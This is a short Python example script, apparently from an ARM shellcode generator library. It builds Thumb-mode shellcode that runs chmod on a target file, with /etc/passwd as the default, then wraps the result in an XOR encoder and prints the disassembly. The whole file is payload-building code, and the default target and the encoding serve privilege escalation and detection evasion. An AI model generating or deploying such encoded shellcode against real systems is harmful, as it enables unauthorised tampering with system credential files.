#!python

from TesterModule import *
import sys

def Run(argv):
    """chmod shellcode example

    Args: 
        argv(list): arugment(s)
    """
    if len(argv) > 0:
        fname = argv[0]
    else:
        fname = '/etc/passwd'

    # ARMSCGen Thumb Class
    scgen = thumbSCGen()
    
    # generates chmod with options
    #   fname(str): file name
    scode  = scgen.chmod(fname)
    scode += scgen.exit(0)

    # compiles shellcode
    scode_binary = CompileSC(scode, isThumb=True)

    # make an encoder with XOR key and compiles
    xor_encoder_with_scode_binary = MakeXorShellcode( scode_binary )

    #print printHex(xor_encoder_with_scode_binary)
    print "XOR shellcode in ARM Mode"
    print disasm(xor_encoder_with_scode_binary, arch='ARM', mode='ARM')
    print "chmod shellcode in Thumb Mode"
    print disasm(scode_binary, arch='ARM', mode='THUMB')

if __name__ == '__main__':
    Run(sys.argv[1:])
